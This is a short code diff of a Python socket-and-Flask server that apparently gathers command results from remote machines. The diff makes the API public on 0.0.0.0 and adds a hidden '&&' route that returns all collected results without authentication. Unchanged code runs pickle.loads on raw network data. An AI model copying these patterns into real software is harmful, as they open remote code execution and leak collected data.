@@ -16,7 +16,7 @@ from flask import Flask, jsonify
 
 
 #Set variables
-HVA = '145.109.151.121'
+HVA = '145.28.188.157'
 l = 'localhost'
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverAddress = l, 1111
@@ -32,12 +32,14 @@ resultDict = {} #Holds who : [{COMMAND : RESULT}]
 
 #   --> p and q are dummy parameters, necessary to start a thread for some reason
 def startFlask(p, q):
-    app.run()
+    app.run(host= '0.0.0.0')
 
 
 #   --> takes a GET request with a WHO, returns all existing records of that machine
-@app.route('/<uname>', methods=['GET'])
+@app.route('/<uname>/', methods=['GET'])
 def APIGET(uname):
+    if uname == "&&":
+        return jsonify(resultDict)
     return (jsonify(resultDict[uname]))
     
 
@@ -102,7 +104,7 @@ def receive(key):
         x = pickle.loads(x) # {COMMAND : RESULT}
         x = { key.decode(): val.strip('\n') for key, val in x.items() } #Remove garbage b and \n
 
-        #Update existing records with different values for same keys, append non existing record
+        #Update existing records with current values for same keys, append non existing record
         for idx, dict in enumerate(resultDict[key]):
             for dictKey in dict.keys():
                 if dictKey == list(x.keys())[0]:
